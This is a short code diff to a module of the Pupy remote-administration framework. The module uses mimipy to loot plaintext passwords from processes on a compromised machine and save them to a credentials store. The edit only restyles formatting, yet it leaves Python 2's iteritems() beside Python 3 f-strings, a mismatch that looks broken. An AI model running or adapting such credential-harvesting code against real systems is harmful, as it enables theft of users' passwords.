@@ -22,14 +22,14 @@ class MimipyMod(PupyModule):
         db = Credentials(client=self.client, config=self.config)
 
         for t, process, u, passwd in self.client.conn.modules['mimipy'].mimipy_loot_passwords(optimizations="nsrx", clean=False):
-            cred={
+            cred = {
                 'Password': passwd,
                 'Login': u,
                 'Host': process,
-                'Category': 'Mimipy: %s'%t,
-                'CredType': 'password'
+                'Category': f'Mimipy: {t}',
+                'CredType': 'password',
             }
-            self.success('\n\t'.join(["%s: %s"%(i,v) for i,v in cred.iteritems()])+"\n\n")
+            self.success('\n\t'.join([f"{i}: {v}" for i,v in cred.iteritems()]) + "\n\n")
             db.add([cred])
             found=True
         if not found:
